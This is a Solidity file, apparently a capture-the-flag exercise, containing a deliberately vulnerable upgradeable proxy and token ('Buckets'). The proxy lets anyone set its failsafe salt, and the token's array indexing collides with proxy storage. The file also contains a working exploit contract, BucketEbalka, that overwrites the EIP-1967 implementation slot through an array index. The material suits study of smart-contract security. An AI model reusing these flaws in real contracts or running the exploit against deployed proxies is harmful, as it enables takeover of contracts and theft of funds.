// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../lib/openzeppelin-contracts/contracts/utils/StorageSlot.sol";
import "../lib/openzeppelin-contracts-upgradeable/contracts/proxy/utils/Initializable.sol";
import "forge-std/console.sol";

contract BucketsProxy is ERC1967Proxy {
    // a secret to change the proxy admin in case of an emergency
    // e. g. if the original admin dies
    uint256 private salt;

    constructor(address logic, uint256 premint) ERC1967Proxy(logic, abi.encodeWithSelector(Buckets.initialize.selector, premint)) {
        _changeAdmin(msg.sender);
    }

    // a failsafe admin has a secret address derived from the 256bit secret
    // we allow the method to be called by anyone to not to reveal secret failsafe addresses
    function setFailsafeAdmin(uint256 salt_) external {
        require(salt_ != 0, "SALT_CANNOT_BE_ZERO");
        salt = salt_;
    }

    // CUSTOM
    function getAdmin() external returns(address) {
        return _getAdmin();
    }

    // only the address that matches the secret should be able to run this method
    // this method should be called in emergency cases when the original administrator has disappeared
    function changeAdmin() external {
        console.logBytes(abi.encode(_getAdmin()));
        console.logBytes32(keccak256(abi.encode(_getAdmin())));
        console.logBytes(abi.encode(salt, msg.sender));
        console.logBytes32(keccak256(abi.encode(salt, msg.sender)));

        require(
          keccak256(abi.encode(salt, msg.sender)) == keccak256(abi.encode(_getAdmin()))
        );
        _changeAdmin(msg.sender);
    }

    // upgrade the Buckets implementation
    function upgradeTo(address newImplementation) external {
        require(_getAdmin() == msg.sender, "ADMIN_ONLY");
        _upgradeTo(newImplementation);
    }
}

abstract contract BucketsBase {
    uint256[] public buckets;
}

contract Buckets is BucketsBase, Initializable, ERC20 {
    uint256 private constant MAX_BUCKETS = 10;

    constructor() ERC20("Buckets", "Bucket") {}

    function initialize(uint256 premint) external initializer {
        buckets = new uint256[](10);
        
        // developers' treasury
        buckets[0] = premint;
        _mint(msg.sender, premint);
    }

    // put some ether in a bucket and mint bucket tokens
    function deposit(uint256 bucketNumber) external payable {
        buckets[bucketNumber] += msg.value;
        _mint(msg.sender, msg.value);
    }

    // withdraw some ether from a bucket and burn bucket tokens
    function withdraw(uint256 bucketNumber, uint256 amount) external {
        buckets[bucketNumber] -= amount;
        _burn(msg.sender, amount);
        payable(msg.sender).transfer(amount);
    }

    // CUSTOM
    function getBytes32Slot(bytes32 slot) public returns (bytes32) {
        return StorageSlot.getBytes32Slot(slot).value;
    }
}

contract BucketEbalka {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address payable _proxy) payable {
        BucketsProxy proxy = BucketsProxy(_proxy);
        Buckets buckets = Buckets(_proxy);

        proxy.setFailsafeAdmin(type(uint256).max);
        bytes32 arrayStart = keccak256(abi.encode(0));

        uint targetIndex = uint(_IMPLEMENTATION_SLOT) - uint(arrayStart);
        console.log(targetIndex);
        buckets.deposit{value: 1}(targetIndex);
    }
}